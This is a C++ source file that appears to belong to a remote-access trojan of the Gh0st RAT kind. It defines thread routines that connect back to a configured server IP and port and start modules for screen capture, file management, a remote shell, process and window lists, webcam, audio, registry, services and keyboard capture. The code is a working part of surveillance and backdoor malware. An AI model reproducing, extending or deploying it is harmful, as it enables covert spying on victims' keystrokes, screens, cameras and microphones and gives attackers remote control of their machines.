#include "StdAfx.h"
#include "Common.h"

#include "ScreenManager.h"
#include "FileManager.h"
#include "TalkManager.h"
#include "ShellManager.h"
#include "SystemManager.h"
#include "AudioManager.h"
#include "RegisterManager.h"
#include "ServicesManager.h"
#include "VideoManager.h"
#include "KeyboardManager.h"

#include "KernelManager.h" 

DWORD WINAPI ThreadProc(LPVOID lParam)
{
	THREAD_ARG_LIST	ThreadArgList = {0};
	memcpy(&ThreadArgList,lParam,sizeof(THREAD_ARG_LIST));
	SetEvent(ThreadArgList.hEvent);

	DWORD dwReturn = ThreadArgList.StartAddress(ThreadArgList.lParam);
	return dwReturn;
}

template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
{
	ThreadInfo *pInfo = (ThreadInfo *)lParam;
	IOCPClient	*ClientObject = pInfo->p;
	CONNECT_ADDRESS& g_SETTINGS(*(pInfo->conn));
	if (ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
	{
		Manager	m(ClientObject, n, pInfo->user);
		ClientObject->RunEventLoop(pInfo->run);
	}
	delete ClientObject;
	pInfo->p = NULL;

	return 0;
}

DWORD WINAPI LoopScreenManager(LPVOID lParam)
{
	return LoopManager<CScreenManager, 0>(lParam);
}

DWORD WINAPI LoopFileManager(LPVOID lParam)
{
	return LoopManager<CFileManager, 0>(lParam);
}

DWORD WINAPI LoopTalkManager(LPVOID lParam)
{
	return LoopManager<CTalkManager, 0>(lParam);
}

DWORD WINAPI LoopShellManager(LPVOID lParam)
{
	return LoopManager<CShellManager, 0>(lParam);
}

DWORD WINAPI LoopProcessManager(LPVOID lParam)   
{
	return LoopManager<CSystemManager, COMMAND_SYSTEM>(lParam);
}

DWORD WINAPI LoopWindowManager(LPVOID lParam)
{
	return LoopManager<CSystemManager, COMMAND_WSLIST>(lParam);
}

DWORD WINAPI LoopVideoManager(LPVOID lParam)
{
	return LoopManager<CVideoManager, 0>(lParam);
}

DWORD WINAPI LoopAudioManager(LPVOID lParam)
{
	return LoopManager<CAudioManager, 0>(lParam);
}

DWORD WINAPI LoopRegisterManager(LPVOID lParam)
{
	return LoopManager<CRegisterManager, 0>(lParam);
}

DWORD WINAPI LoopServicesManager(LPVOID lParam)
{
	return LoopManager<CServicesManager, 0>(lParam);
}

DWORD WINAPI LoopKeyboardManager(LPVOID lParam)
{
	return LoopManager<CKeyboardManager1, 0>(lParam);
}
